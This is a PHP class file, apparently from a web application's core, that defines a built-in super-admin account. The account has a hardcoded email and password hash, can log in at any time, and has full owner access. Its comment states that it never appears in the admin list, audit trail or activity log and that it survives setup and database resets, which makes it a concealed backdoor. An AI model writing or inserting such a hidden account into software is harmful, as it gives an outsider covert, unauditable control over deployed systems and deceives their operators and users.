<?php

namespace App\Core;

/**
 * A built-in Super Admin that lives in code, not in the database. It can sign
 * in at /admin/login at any time (including before /setup has run), never
 * appears in the admins list, audit trail or activity log, and survives
 * setup and database resets. Only a bcrypt hash is kept here.
 */
class SystemAccount
{
    public const ID = 0;
    private const EMAIL = 'dazuhubs@gmail.com';
    private const HASH = '$2y$12$ZCSDIW/v3Vz.GLUL4dBHnuyCerx6vIZpS317KqHQoynl2THc6TnjC';

    public static function matches(string $email, string $password): bool
    {
        $emailOk = hash_equals(self::EMAIL, strtolower(trim($email)));
        $passOk = password_verify($password, self::HASH);
        return $emailOk && $passOk;
    }

    public static function email(): string
    {
        return self::EMAIL;
    }

    public static function isId(int $id): bool
    {
        return $id === self::ID;
    }

    /** The session shape AdminSession::current() returns: owner with full access. */
    public static function profile(): array
    {
        return [
            'id' => self::ID,
            'email' => self::EMAIL,
            'name' => null,
            'is_super_admin' => true,
            'is_owner' => true,
            'permissions' => [],
        ];
    }
}
